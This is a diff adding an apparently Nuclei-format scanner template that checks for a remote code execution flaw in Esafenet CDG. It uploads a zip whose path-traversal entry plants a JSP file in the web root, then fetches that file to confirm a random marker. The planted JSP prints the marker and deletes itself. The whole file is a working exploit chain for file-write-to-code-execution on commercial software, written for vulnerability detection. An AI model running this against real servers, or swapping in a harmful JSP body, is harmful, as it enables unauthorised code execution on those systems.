@@ -1,0 +1,46 @@
+id: esafenet-cdg-rce
+info:
+  name: 亿赛通 CDG - 远程代码执行漏洞
+  author: kun.fang
+  severity: critical
+  metadata:
+    verified: true
+    max-request: 2
+    vuln-id: CT-1056284
+    vendor: esafenet
+    product: cdg
+  tags: rce,vuln,esafenet
+variables:
+  randomFileName: '{{to_lower(rand_text_alpha(8))}}'
+  randomContent: '{{to_lower(rand_text_alpha(8))}}'
+  rboundary: '{{to_lower(rand_text_alpha(8))}}'
+  fname: '{{concat("../../../js/", randomFileName, ".jsp")}}'
+  filecontent: '{{concat("<% out.print(\"", randomContent, "\"); new java.io.File(application.getRealPath(request.getServletPath())).delete();%>")}}'
+  payload: '{{zip(fname, filecontent)}}'
+flow: http(1) && http(2)
+http:
+- method: POST
+  path:
+  - '{{BaseURL}}/CDGServer3/hiddenWatermark/uploadFile'
+  redirects: false
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+  body: |
+    ------WebKitFormBoundary{{rboundary}}
+    Content-Disposition: form-data; name="doc"; filename="{{randomFileName}}.zip"
+    Content-Type: application/zip
+
+    {{payload}}
+    ------WebKitFormBoundary{{rboundary}}--
+  matchers:
+  - type: dsl
+    dsl:
+    - 'status_code == 200'
+- method: GET
+  path:
+  - '{{BaseURL}}/CDGServer3/js/{{randomFileName}}.jsp'
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - 'status_code == 200 && contains(body, randomContent)'
